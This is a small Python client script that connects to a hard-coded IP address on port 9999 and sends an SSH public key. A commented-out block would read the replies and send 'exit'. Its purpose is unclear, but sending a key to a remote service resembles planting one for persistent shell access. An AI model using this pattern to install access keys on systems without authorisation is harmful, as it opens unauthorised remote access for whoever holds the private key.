# -*- coding:utf-8 -*-

import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('106.15.179.96',9999))
data=b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK6S43yHLPMx/p1oWJplF3vbrVLREplnbsP0wQByj0mIJlw9Un0iVKlefKvBXIs9uxvl47wml4w1t9HRXSxC57OdaF5vtygupM3Ys6iBLtYNuMsUBgdtaeaZ6RHuFO1gqp3xOWmZV35TwDQW+Km7pEUDiv2nvAm9EOFeOEfd0MQndq8bl+nu+zAaQ1v2f/vWVwtNTbuszvj3jqswCEYfKpOrzmoIPsLJxGhL7KnLWJ54sYC90AX1YeNZnWksYuU4UjKqExH08r79qbZmPmEOmgRWCXe119jM9l58WJWElvnyD0gAgb6lNoLzSldCR+yz0pyWHWU5GnKxqUH96ATned stillg@foxmail.com'
s.send(data)
'''
print(s.recv(1024))
for data in [b'']:
    s.send(data)
    print(s.recv(1024).decode('utf-8'))
s.send(b'exit')
'''
s.close()
